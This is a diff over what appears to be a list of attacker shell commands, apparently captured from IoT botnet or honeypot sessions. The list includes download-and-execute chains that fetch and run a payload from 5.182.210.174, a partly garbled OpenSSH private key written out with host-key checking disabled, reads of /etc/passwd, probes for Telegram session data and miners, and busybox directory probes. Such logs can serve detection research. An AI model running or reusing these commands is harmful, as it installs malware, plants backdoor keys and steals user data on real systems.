@@ -14,15 +14,14 @@ su
 busybox uname -s -v -n -m 2 > /dev/null
 head -1 /proc/version | cut -d -f1
 uname -s -v -n -m 2 > /dev/null
-uname -s -v -n -r -m
 
+uname -s -v -n -r -m
 cd /tmp
 curl -O http://5.182.210.174/ok
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
 echo xsec
-&k`g&k|zpkfq)ES[M
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
 AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
@@ -33,8 +32,9 @@ bash
 cat /etc/passwd
 cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
 echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
-g & k | zpkfq
 id
+&k`g&k|zpkfq)ES[M
+g & k | zpkfq
 uname -a
 exit
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
@@ -63,6 +63,7 @@ hostname
 rm ./upnpsetup
 sudo ./upnpsetup
 uname -m&&pkill upnpsetup
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x43\x41\x47\x52\x4a'
 /bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x4b\x53\x44\x48\x51'
 PING
@@ -80,7 +81,6 @@ ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop
 ps -ef | grep '[Mm]iner'
 ps | grep '[Mm]iner'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x56\x4d\x50\x50\x55'
->/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x43\x41\x47\x52\x4a'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x49\x5a\x47\x5a\x44'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x45\x52\x46\x49\x49'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x4c\x50\x57\x50\x48'
